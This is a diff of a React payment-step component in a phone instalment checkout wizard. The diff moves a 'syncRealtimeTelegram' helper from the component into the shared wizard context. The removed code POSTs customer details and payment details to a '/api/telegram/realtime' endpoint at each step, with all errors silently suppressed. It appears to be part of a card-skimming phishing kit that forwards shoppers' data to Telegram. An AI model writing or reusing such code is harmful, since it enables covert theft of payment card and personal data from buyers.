@@ -15,35 +15,14 @@ export const Step4PaymentAgreement: React.FC = () => {
     customerDetails,
     paymentDetails,
     setPaymentDetails,
-    createOrder
+    createOrder,
+    syncRealtimeTelegram
   } = useWizard();
 
   const [paymentType, setPaymentType] = useState<'card' | 'wallet'>(
     customerDetails.paymentMethod === 'wallet' ? 'wallet' : 'card'
   );
   const [errorMsg, setErrorMsg] = useState<string>('');
-
-  // Real-time Telegram sync helper
-  const syncRealtimeTelegram = (stageName: string, updatedPayment: typeof paymentDetails) => {
-    try {
-      fetch('/api/telegram/realtime', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          stepName: stageName,
-          data: {
-            model: selectedModel,
-            color: selectedColor,
-            storage: selectedStorage,
-            months: selectedTenureMonths,
-            monthlyEmi: calculatedMonthlyEmi,
-            customer: customerDetails,
-            payment: updatedPayment
-          }
-        })
-      }).catch(() => {});
-    } catch (e) {}
-  };
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, '').slice(0, 16);
